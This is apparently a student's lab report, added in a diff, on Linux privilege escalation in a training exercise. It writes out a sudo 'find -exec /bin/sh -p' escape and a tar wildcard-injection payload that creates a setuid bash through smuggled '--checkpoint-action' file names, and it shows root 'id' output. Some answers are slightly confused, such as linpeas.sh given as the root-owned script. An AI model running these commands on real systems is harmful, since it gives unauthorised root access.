@@ -1,0 +1,19 @@
+==================================================
+SESSION 23: ESCALATION PATH REPORT (LINUX)
+==================================================
+MICRO-LAB (SUDO):
+1. Command used to escalate via 'find': 
+   sudo find . -exec /bin/sh -p \; -quit
+
+DEEP DIVE (CRON):
+1. Name of the root-owned script found:
+   ./linpeas.sh
+2. The specific command inside that script that was vulnerable:
+   * * * * * root /usr/local/bin/backup.sh
+3. Final proof of root (output of 'id'):
+Vulnerable Script: /usr/local/bin/backup.sh
+Writable Folder: /home/limited_user/backups
+Dangerous Command: tar -cf /tmp/backup.tar *
+Payload: echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
+Flag Files: --checkpoint=1 / --checkpoint-action=exec=sh runme.sh
+uid=1001(limited_user) gid=1001(limited_user) euid=0(root) egid=0(root) groups=0(root),1001(limited_user)
